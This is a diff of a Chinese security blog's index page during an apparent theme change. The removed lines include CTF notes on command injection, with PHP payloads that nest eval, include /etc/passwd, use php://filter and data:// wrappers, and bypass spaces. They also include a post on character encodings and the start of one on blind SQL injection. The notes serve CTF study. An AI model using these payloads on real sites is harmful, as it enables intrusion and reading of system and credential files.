@@ -1,1857 +1,305 @@
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 5.4.2">
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-
-<script id="hexo-configurations">
-    var NexT = window.NexT || {};
-    var CONFIG = {"hostname":"qyzy.github.io","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
-  </script>
-
-  <meta property="og:type" content="website">
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Welcome To QYZY's Blog</title><meta name="author" content="竹云"><meta name="copyright" content="竹云"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta property="og:type" content="website">
 <meta property="og:title" content="Welcome To QYZY&#39;s Blog">
 <meta property="og:url" content="https://qyzy.github.io/page/2/index.html">
 <meta property="og:site_name" content="Welcome To QYZY&#39;s Blog">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
 <meta property="article:author" content="竹云">
 <meta name="twitter:card" content="summary">
-
-<link rel="canonical" href="https://qyzy.github.io/page/2/">
-
-
-<script id="page-configurations">
-  // https://hexo.io/docs/variables.html
-  CONFIG.page = {
-    sidebar: "",
-    isHome : true,
-    isPost : false,
-    lang   : 'zh-CN'
-  };
-</script>
-
-  <title>Welcome To QYZY's Blog</title>
-  
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-header { opacity: initial; }
-
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://qyzy.github.io/page/2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Welcome To QYZY\'s Blog',
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-08-22 21:29:04'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
   }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
-
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage">
-  <div class="container use-motion">
-    <div class="headband"></div>
-
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="切换导航栏">
-      <span class="toggle-line toggle-line-first"></span>
-      <span class="toggle-line toggle-line-middle"></span>
-      <span class="toggle-line toggle-line-last"></span>
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <span class="logo-line-before"><i></i></span>
-      <h1 class="site-title">Welcome To QYZY's Blog</h1>
-      <span class="logo-line-after"><i></i></span>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
-</div>
-
-
-
-
-<nav class="site-nav">
-  <ul id="menu" class="main-menu menu">
-        <li class="menu-item menu-item-home">
-
-    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
-
-  </li>
-        <li class="menu-item menu-item-tags">
-
-    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
-
-  </li>
-        <li class="menu-item menu-item-categories">
-
-    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
-
-  </li>
-        <li class="menu-item menu-item-archives">
-
-    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
-
-  </li>
-  </ul>
-</nav>
-
-
-
-
-</div>
-    </header>
-
-    
-  <div class="back-to-top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-
-    <main class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-
-          <div class="content index posts-expand">
-            
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
       
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2023/01/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/01/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="post-title-link" itemprop="url">命令执行</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2023-01-14 23:15:16" itemprop="dateCreated datePublished" datetime="2023-01-14T23:15:16+08:00">2023-01-14</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:35:19" itemprop="dateModified" datetime="2023-04-23T17:35:19+08:00">2023-04-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
+        get: key => {
+          const itemStr = localStorage.getItem(key)
       
-          <p>命令注入的本质：<strong>系统把用户输入的参数当成了要执行的命令，并且这些命令被执行了</strong><br />
-命令注入产生的原因：<br />
-1. web网站没有对用户提交的参数进行有效的检测过滤。<br />
-2. 操作系统允许一条语句执行多条命令（连接符和管道符）</p>
-<p>windows操作系统命令 |命令|功能| |----|----| |ping|检测网络连通性|
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">15</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr class="custom-hr"/></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Welcome To QYZY's Blog"><span class="site-name">Welcome To QYZY's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Welcome To QYZY's Blog</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/01/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="命令执行">命令执行</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-01-14T15:15:16.000Z" title="发表于 2023-01-14 23:15:16">2023-01-14</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/CTF/">CTF</a></span></div><div class="content">命令注入的本质：系统把用户输入的参数当成了要执行的命令，并且这些命令被执行了
+命令注入产生的原因：
+1. web网站没有对用户提交的参数进行有效的检测过滤。
+2. 操作系统允许一条语句执行多条命令（连接符和管道符）
+windows操作系统命令 |命令|功能| |----|----| |ping|检测网络连通性|
 |ipconfig|查看当前ip地址| |netstat|查看网络端口及连接情况| |net
 uesr|查看、增加、删除当前系统用户| |net
 localgroup|查看、增加、删除当前系统用户组|
 |dir|列出当前目录下的文件和子目录信息| |req|注册表及其相关操作|
 |systeminfo|查看当前计算机的综合信息|
-|tasklist|显示当前运行的进程信息（可查看PID）|</p>
-<p>linux操作系统命令 |命令|功能| |----|----|
+|tasklist|显示当前运行的进程信息（可查看PID）|
+linux操作系统命令 |命令|功能| |----|----|
 |ifconfig|查看当前ip、mac等信息| |netstat|查看网络端口及连接情况|
 |whoami|查看当前用户| |cat|查看文件内容|
-|ls|查看当前目录下的文件和子目录信息| |useradd|添加用户|
-|userdel|删除用户| |passwd|修改用户密码|</p>
-<table>
-<colgroup>
-<col style="width: 72%" />
-<col style="width: 27%" />
-</colgroup>
-<thead>
-<tr class="header">
-<th>命令格式</th>
-<th>含义</th>
-</tr>
-</thead>
-<tbody>
-<tr class="odd">
-<td>command1 &amp; command2（windows）command1； command2（linux）</td>
-<td>先后执行command1和command2，无论command1是否执行成功</td>
-</tr>
-<tr class="even">
-<td>command1 &amp;&amp; command2</td>
-<td>先后执行command1和command2，只有command1执行成功时才执行command2</td>
-</tr>
-<tr class="odd">
-<td>command1||command2</td>
-<td>先后执行command1和command2，只有command1执行失败时才执行command2</td>
-</tr>
-<tr class="even">
-<td>command1|command2</td>
-<td>|是管道符，将command1执行的结果传递给command2</td>
-</tr>
-</tbody>
-</table>
-<h2 id="section">------</h2>
-<hr />
-<p>PHP最后一条语句可以没有分号。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = system(&quot;cp flag.php 1.txt&quot;);</span><br></pre></td></tr></table></figure>
-反引号`和system函数作用相同 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = `cp flag.php 1.txt`</span><br></pre></td></tr></table></figure> 嵌套执行 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = eval($_GET[1]);&amp;1=system(&quot;cat flag.php&quot;);</span><br></pre></td></tr></table></figure>
-tac倒序输出文件 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = include%0a$_GET[1];&amp;1=/etc/passwd</span><br><span class="line"></span><br><span class="line">1=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=require%0a$_GET[1]?&gt;&amp;1=/etc/passwd</span><br></pre></td></tr></table></figure> 语言结构（不需要使用括号）
-echo print isset unset include require</p>
-<p>data伪协议 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data://text/plain;&lt;?php phpinfo()?&gt;</span><br></pre></td></tr></table></figure> &gt; 短标签 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=php system(&#x27;cp flag.php 1.txt&#x27;);?&gt;</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>phpinfo()的返回值是1</p>
-</blockquote>
-<blockquote>
-<p>print_r(get_defined_vars());<br />
-输出当前所有变量<br />
-array_pop(next(get_defined_vars()));<br />
-弹出数组的值<br />
-eval()即可执行</p>
-</blockquote>
-<blockquote>
-<p>/&gt;dev/null 2&gt;&amp;1<br />
-无回显，可用双写绕过<br />
-<code>?c=ls;ls</code><br />
-第一个命令正常输出<br />
-<code>&amp;&amp;</code></p>
-</blockquote>
-<blockquote>
-<p>%20 %09 {$IFS}代替空格</p>
-</blockquote>
-<blockquote>
-<p><code>?c=nl&lt;flag.php&gt;</code></p>
-</blockquote>
-<p>上传文件表单，抓包，将内容改为 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#bin/sh</span><br><span class="line"></span><br><span class="line">cat flag.php</span><br></pre></td></tr></table></figure>
-并将c参数改为<code>.%20/???/????????[@-[]</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(())--&gt;0  </span><br><span class="line">~$(())--&gt;-0  </span><br><span class="line">$((~$(())))--&gt;-1</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>构造数字</p>
-</blockquote>
-<p>文件读取<br />
-* file_get_contents * highlight_file * show_source</p>
-<p>包含文件后
-<code>var_dump(get_defined_vars())</code>或<code>echo $flag</code></p>
-<p>查看目录<br />
-<code>print_r(scandir('.'));</code></p>
-<p>curl <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;file://var/www/html/flag.php&quot;;</span><br><span class="line"> </span><br><span class="line">$ch = curl_init();</span><br><span class="line"> </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);</span><br><span class="line">$output = curl_exec($ch);</span><br><span class="line"> </span><br><span class="line">curl_close($ch);</span><br><span class="line"> </span><br><span class="line">echo $output;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+|ls|查看当前目录下的文件和子目录信息| |u ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2022/12/09/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E9%82%A3%E4%BA%9B%E4%BA%8B/" title="字符编码那些事">字符编码那些事</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2022-12-09T10:28:04.000Z" title="发表于 2022-12-09 18:28:04">2022-12-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/MISC/">MISC</a></span></div><div class="content">ASCII码（美国信息交换标准代码）
+每个字符都有一个对应的数字叫做码点，ASCII的码点为0~127之间的数字，标准所支持的所有字符及其对应码点的集合，叫做字符集。ASCII字符集一共包含128个字符。一般用一字节（8比特）长度来储存每个字符。这种从字符到计算机能够读取的二进制的映射叫做编码(encode)，而将二进制读取为数据的过程叫做解码(decode)
+规则
 
-      
-    </div>
+所有的控制字符编码在0~31范围及127中。
+所有的标点符号，英文大小写全部放在32~126范围中。
+第一位始终为0，后面7位表示0~127的范围。
 
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/12/09/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E9%82%A3%E4%BA%9B%E4%BA%8B/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/12/09/%E5%AD%97%E7%AC%A6%E7%BC%96%E7%A0%81%E9%82%A3%E4%BA%9B%E4%BA%8B/" class="post-title-link" itemprop="url">字符编码那些事</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-12-09 18:28:04" itemprop="dateCreated datePublished" datetime="2022-12-09T18:28:04+08:00">2022-12-09</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:34:23" itemprop="dateModified" datetime="2023-04-23T17:34:23+08:00">2023-04-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/MISC/" itemprop="url" rel="index"><span itemprop="name">MISC</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1
-id="ascii码美国信息交换标准代码">ASCII码（美国信息交换标准代码）</h1>
-<p>每个字符都有一个对应的数字叫做码点，ASCII的码点为0~127之间的数字，标准所支持的所有字符及其对应码点的集合，叫做字符集。ASCII字符集一共包含128个字符。一般用一字节（8比特）长度来储存每个字符。这种从字符到计算机能够读取的二进制的映射叫做<strong>编码(encode)</strong>，而将二进制读取为数据的过程叫做<strong>解码(decode)</strong></p>
-<h2 id="规则">规则</h2>
-<ul>
-<li>所有的控制字符编码在0~31范围及127中。</li>
-<li>所有的标点符号，英文大小写全部放在32~126范围中。</li>
-<li>第一位始终为0，后面7位表示0~127的范围。</li>
-</ul>
-<h1 id="gb2312">GB2312</h1>
-<p>当计算机技术传到亚洲时，发现字符的个数远远超过255,于是只能使用2个字节
+GB2312
+当计算机技术传到亚洲时，发现字符的个数远远超过255,于是只能使用2个字节
 ## 规则 * 如果一个字节中第一位为0，那么这就是一个ASCII字符。 *
-当读到一个数值上小于127的字节时当作一个ASCII中原有的字符处理。读到一个数值大于127的字节时会继续读取下一个字节，下一个字节的数值也必定大于127，将两个大于127的字节一起组合形成一个字符。</p>
-<p>把这个码表叫做GB2312</p>
-<h1 id="gbk">GBK</h1>
-<p>GB2312只收录了常见的一些汉字，没有办法表示不常用的生僻字，于是在GB2312的基础上增加了字符。
-## 规则 *
-使用GBK编码，当读取到一个数值上小于127的字节时当作一个ASCII中原有的字符处理，<strong>读到一个数值大于127的字节时必定会读取下一个字节，下一个字节的数值无需大于127</strong>将两个字节一起组合形成一个汉字字符。</p>
-<h1 id="unicode">Unicode</h1>
-<p>不同国家之间的编码很难相互转化，于是出现了一个全球性的非政府组织，叫做国际标准化组织，全称是Internation
-Organization for
-Standardization,简称ISO。他们要搞一个包含全世界所有符号的编码，把这套编码方案叫做Universal
-Multiple-Octet Coded Character Set,简称UCS，俗称Unicode。</p>
-<h1 id="utf-x">UTF-X</h1>
-<p>在传输中存在大量的字节位浪费，于是出现了许多UTF（UCS Transfer
-Format）标准，常见的有：UTF-8,UTF-16,UTF-32。他们遵循Unicode字符集标准，但却改变了它的字节存储方案。</p>
-<p><strong>UTF-8是Unicode的实现方式之一</strong>UTF-8是一种变长的编码方式。它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。
-## 规则 *
-对于单字节的符号，字节的第一位设为0，后面七位为这个符号的Unicode码。 *
-对于n字节的符号，第一个字节的前n位都为1，第n+1位设为0.后面字节的前两位一律设为10.剩下的没有提及的二进制位，全部为这个符号的Unicode码
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0xxxxxxx</span><br><span class="line">110xxxxx 10xxxxxx</span><br><span class="line">1110xxxx 10xxxxxx 10xxxxxx</span><br><span class="line">11110xxx 10xxxxxx 10xxxxxx 10xxxxxx</span><br></pre></td></tr></table></figure>
-如果一个字节的第一位是0，则这个字节单独就是一个字符：如果第一位是1，则连续有多少个1，就表示当前字符占用多少字节。</p>
-<h1 id="锟斤拷">锟斤拷</h1>
-<p>常见于UTF-8和中文编码的转换中，Unicode字符集中有一个特殊的替换符号<code>�</code>，专门用于表示无法识别或展示的字符，有些编辑器在编码为UTF-8时，会把无法识别或展示的字符，自动替换为这个替换符号。它在UTF-8编码后，是<code>11101111 10111111 10111101</code>这个三字节长度的二进制数字，转换为十六进制就是<code>EF BF BD</code>，如果用户在替换后保存了，这个特殊符号就会替代原本的字符，如果有两个替换符号正好连在一起，就会有<code>EF BF BD EF BF BD</code>,这时候再把文件用GBK编码读取，每个两个连着的特殊符号都变成了<code>锟斤拷</code>。因为GBK用两个字节表示汉字，而<code>EF BF</code>,<code>BD EF</code>.<code>BF BD</code>正好分别对应<code>锟</code>,<code>斤</code>,<code>拷</code></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://qyzy.github.io/2022/11/18/%E7%9B%B2%E6%B3%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://github.com/QYZY/image/blob/main/cat.jpg?raw=true">
-      <meta itemprop="name" content="竹云">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Welcome To QYZY's Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/11/18/%E7%9B%B2%E6%B3%A8/" class="post-title-link" itemprop="url">盲注</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-11-18 17:21:04" itemprop="dateCreated datePublished" datetime="2022-11-18T17:21:04+08:00">2022-11-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-04-23 17:35:28" itemprop="dateModified" datetime="2023-04-23T17:35:28+08:00">2023-04-23</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="盲注的两个基本问题">盲注的两个基本问题</h1>
-<h2 id="字符串的截取">1. 字符串的截取</h2>
-<p><strong>substr()</strong><br />
-<code>substr(要截取的字符串，从哪一位开始截取，截取多长)</code>
-注意，这里截取的开始位数是从1开始数的，substr和substring是同名函数。</p>
-<p><strong>mid()</strong><br />
-和substr()用法基本一样，是substr()完美的替代品。</p>
-<p><strong>right()</strong><br />
-表示截取字符串的右面几位。 <code>right(接却的字符串，截取长度)</code>
+当读到一个数值上小于127的字节时当作一个ASCII中原有的字符处理。读到一个数值大于127的字节时会继续读取下一个字节，下一个字节的数值也必定大于127，将两个大于127的字节一起组合形成一个字符。
+把这个码表叫做GB2312
+GBK
